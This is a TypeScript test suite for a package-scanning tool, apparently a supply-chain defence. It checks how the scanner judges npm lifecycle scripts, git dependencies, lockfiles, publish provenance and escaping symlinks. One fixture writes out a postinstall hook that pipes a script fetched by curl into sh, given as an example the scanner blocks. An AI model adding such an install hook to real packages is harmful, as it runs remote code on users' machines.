import assert from 'node:assert/strict'
import { mkdtemp, mkdir, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, it } from 'node:test'
import { scanDirectory } from '../src/scan.js'

async function fixture(manifest: Record<string, unknown>, files: Record<string, string> = {}): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'upstream-radar-'))
  await writeFile(join(root, 'package.json'), `${JSON.stringify(manifest, null, 2)}\n`)
  for (const [path, contents] of Object.entries(files)) {
    const fullPath = join(root, path)
    const parent = fullPath.slice(0, fullPath.lastIndexOf('/'))
    await mkdir(parent, { recursive: true })
    await writeFile(fullPath, contents)
  }
  return root
}

describe('directory scanner', () => {
  it('recognizes a minimal DSH bundle', async () => {
    const root = await fixture(
      {
        name: 'safe-example',
        version: '1.0.0',
        dsh: { bundle: { patch: 'cordis.patch.yml' } },
      },
      { 'cordis.patch.yml': 'name: safe-example\n' },
    )

    const report = await scanDirectory(root)
    assert.equal(report.dsh.isBundle, true)
    assert.equal(report.dsh.patch, 'cordis.patch.yml')
    assert.equal(report.riskVerdict, 'allow')
    assert.equal(report.coverageVerdict, 'incomplete')
    assert.equal(report.verdict, 'review')
    assert.match(report.target.artifactDigest, /^sha256:[0-9a-f]{64}$/)
  })

  it('requires review when a declared DSH patch is not a regular file', async () => {
    const root = await fixture({
      name: 'missing-patch',
      version: '1.0.0',
      dsh: { bundle: { patch: 'missing.patch.yml' } },
    })

    const report = await scanDirectory(root)
    assert.equal(report.riskVerdict, 'review')
    assert.ok(report.findings.some(item => item.code === 'dsh-patch-not-regular-file'))
  })

  it('requires review for lifecycle scripts', async () => {
    const root = await fixture({
      name: 'builds-on-install',
      version: '1.0.0',
      scripts: { prepare: 'node scripts/build.js' },
    })

    const report = await scanDirectory(root)
    assert.equal(report.riskVerdict, 'review')
    assert.equal(report.verdict, 'review')
    assert.ok(report.findings.some(item => item.code === 'lifecycle-script-present'))
  })

  it('blocks a remote shell installation pipeline', async () => {
    const root = await fixture({
      name: 'remote-shell',
      version: '1.0.0',
      scripts: { postinstall: 'curl https://example.invalid/install.sh | sh' },
    })

    const report = await scanDirectory(root)
    assert.equal(report.riskVerdict, 'block')
    assert.equal(report.verdict, 'block')
    assert.ok(report.findings.some(item => item.code === 'install-script-remote-shell'))
  })

  it('requires review for an unpinned git dependency', async () => {
    const root = await fixture({
      name: 'mutable-dependency',
      version: '1.0.0',
      dependencies: { example: 'git+https://github.com/example/project.git#main' },
    })

    const report = await scanDirectory(root)
    assert.equal(report.verdict, 'review')
    assert.ok(report.findings.some(item => item.code === 'mutable-git-dependency'))
  })

  it('reports stale npm lockfile root metadata without treating it as a vulnerability', async () => {
    const root = await fixture(
      { name: 'dsh-composer-expand', version: '0.1.2' },
      {
        'package-lock.json': JSON.stringify({
          name: 'dsh-composer-expand',
          version: '0.1.0',
          lockfileVersion: 3,
          packages: { '': { name: 'dsh-composer-expand', version: '0.1.0' } },
        }),
      },
    )

    const report = await scanDirectory(root)
    const finding = report.findings.find(item => item.code === 'lockfile-root-metadata-stale')
    assert.equal(finding?.severity, 'info')
    assert.equal(report.riskVerdict, 'allow')
    assert.match(finding?.remediation ?? '', /Regenerate package-lock\.json/)
    assert.equal(report.evidence.dependencyGraph, undefined)
    assert.match(report.evidence.dependencyGraphError ?? '', /requested root package is not present/)
  })

  it('finds an npm publication path that does not declare provenance', async () => {
    const root = await fixture(
      { name: 'release-example', version: '1.0.0' },
      {
        '.github/workflows/release.yml': 'jobs:\n  publish:\n    steps:\n      - run: pnpm run release:publish\n',
        'scripts/release/publish.ts': "attemptEchoed('npm', ['publish', tarball])\n",
      },
    )

    const report = await scanDirectory(root)
    const finding = report.findings.find(item => item.code === 'npm-publish-provenance-not-declared')
    assert.equal(finding?.severity, 'medium')
    assert.match(finding?.remediation ?? '', /id-token: write/)
    assert.deepEqual(finding?.evidence?.workflowPaths, ['.github/workflows/release.yml'])
    assert.deepEqual(finding?.evidence?.publisherPaths, ['scripts/release/publish.ts'])
  })

  it('accepts an npm publication path that explicitly enables provenance', async () => {
    const root = await fixture(
      { name: 'release-with-provenance', version: '1.0.0' },
      {
        '.github/workflows/release.yml': 'jobs:\n  publish:\n    permissions:\n      id-token: write\n    steps:\n      - run: npm publish --provenance\n',
      },
    )

    const report = await scanDirectory(root)
    assert.equal(report.findings.some(item => item.code === 'npm-publish-provenance-not-declared'), false)
  })

  it('accepts a GitHub OIDC trusted-publishing path', async () => {
    const root = await fixture(
      { name: 'trusted-release', version: '1.0.0' },
      {
        '.github/workflows/release.yml': 'permissions:\n  id-token: write\njobs:\n  publish:\n    steps:\n      - run: npm publish --access public\n',
      },
    )

    const report = await scanDirectory(root)
    assert.equal(report.findings.some(item => item.code === 'npm-publish-provenance-not-declared'), false)
  })

  it('reads a committed npm lockfile into the scan report without installing anything', async () => {
    const root = await fixture(
      {
        name: 'locked-example',
        version: '1.0.0',
        dependencies: { direct: '1.0.0' },
      },
      {
        'package-lock.json': JSON.stringify({
          name: 'locked-example',
          version: '1.0.0',
          lockfileVersion: 3,
          packages: {
            '': { name: 'locked-example', version: '1.0.0', dependencies: { direct: '1.0.0' } },
            'node_modules/direct': { version: '1.0.0', dependencies: { transitive: '1.0.0' } },
            'node_modules/transitive': { version: '1.0.0' },
          },
        }),
      },
    )

    const report = await scanDirectory(root)
    assert.equal(report.coverage.dependencyResolution, 'resolved')
    assert.equal(report.evidence.dependencyGraph?.nodes.length, 3)
    assert.equal(report.evidence.dependencyGraph?.edges.length, 2)
    assert.equal(report.evidence.dependencyGraph?.unresolved, undefined)
    assert.equal(report.findings.some(item => item.code === 'dependency-graph-unavailable'), false)
  })

  it('keeps unresolved lockfile edges visible as incomplete monitoring coverage', async () => {
    const root = await fixture(
      { name: 'incomplete-example', version: '1.0.0', dependencies: { missing: '1.0.0' } },
      {
        'package-lock.json': JSON.stringify({
          name: 'incomplete-example',
          version: '1.0.0',
          lockfileVersion: 3,
          packages: {
            '': { name: 'incomplete-example', version: '1.0.0', dependencies: { missing: '1.0.0' } },
          },
        }),
      },
    )

    const report = await scanDirectory(root)
    assert.equal(report.coverage.dependencyResolution, 'resolved')
    assert.equal(report.evidence.dependencyGraph?.unresolved?.length, 1)
    assert.equal(report.findings.find(item => item.code === 'dependency-graph-incomplete')?.severity, 'info')
  })

  it('blocks a symlink that escapes the reviewed root', async () => {
    const root = await fixture({ name: 'escaping-link', version: '1.0.0' })
    await symlink('../outside', join(root, 'outside-link'))

    const report = await scanDirectory(root)
    assert.equal(report.verdict, 'block')
    assert.ok(report.findings.some(item => item.code === 'symlink-escapes-package'))
  })

  it('counts symlinks and directories against the scan entry budget', async () => {
    const root = await fixture({ name: 'entry-budget', version: '1.0.0' })
    await symlink('package.json', join(root, 'one-link'))

    const report = await scanDirectory(root, { maxFiles: 1 })
    assert.equal(report.coverage.staticSource, 'incomplete')
    assert.ok(report.findings.some(item => item.code === 'scan-budget-exceeded'))
  })
})
